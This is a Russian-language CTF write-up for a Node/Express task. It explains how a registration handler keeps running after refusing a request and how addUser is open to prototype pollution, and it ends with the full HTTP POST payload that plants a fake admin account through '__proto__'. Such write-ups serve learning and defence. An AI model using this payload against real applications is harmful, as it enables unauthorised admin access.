# Highloady writeup

Решающий после того как ознакомился с исходными кодами задачи, которые были приложены в ее описании, должен обратить внимание на фунцию логику эндпоинта `/register`.

```js
const REGISTRATION_OPEN = false

app.post("/register", (req, res) => {
  try {
    const { body } = req
    if (!REGISTRATION_OPEN) {
      res.send("Registration closed :(")
    }
    addUser(body)
    res.send("Success!")
  } catch {}
})
```
Можно заметить, что выполнение функции не заканчивается после вызова `res.send` с аргументом `Registerion closed :(`, а это значит что мы можем вызвать функцию `addUser`.

Рассмотрим функцию `addUser`.
```js
const addUser = user => {
  if (Object.keys(users).includes(user.username) || user.isAdmin) {
    return
  }

  users[user.username] = {
    ...user,
    password: md5(user.password),
    isAdmin: false
  }
}
```

Мы можем видить проверку на то, что имя пользователя не занято и что создаваемый пользователь не является админом.
Однако, как решающий мог заметить, эта функция уязвима к prototype pollution. Мы можем изменить прототип объекта `users` добавив туда объект вида:

```js
{
    username: {
        username: "username",
        password: "md5(password)",
        isAdmin: true
    }
}
```

Тем самым мы "добавляем" пользователя с правами администратора ведь при обращении `users["username"]` мы получим объект указанный выше.

Чтобы сделать prototype pollution нужно вызвать функцию addUser со следующим аргументом:
```js
{
    username: "__proto__",
    password: "11231313",
    testuser: {
        username: "testuser",
        password: "5d9c68c6c50ed3d02a2fcf54f63993b6", // md5(testuser)
        isAdmin: true
    }
}
```
После этого вызова фунции addUser с этим аргументом мы сможем авторизоваться при помощи логина testuser и пароля testuser, причем данный пользователь будет админом.

Чтобы решить задачу надо было сделать следующий запрос

```
POST /register HTTP/1.1
Host: localhost:5000
Content-Type: application/x-www-form-urlencoded
Referer: http://localhost:5000/
Content-Length: 119

username=__proto__&testuser[username]=testuser&testuser[password]=5d9c68c6c50ed3d02a2fcf54f63993b6&testuser[isAdmin]=1&password=123
``````
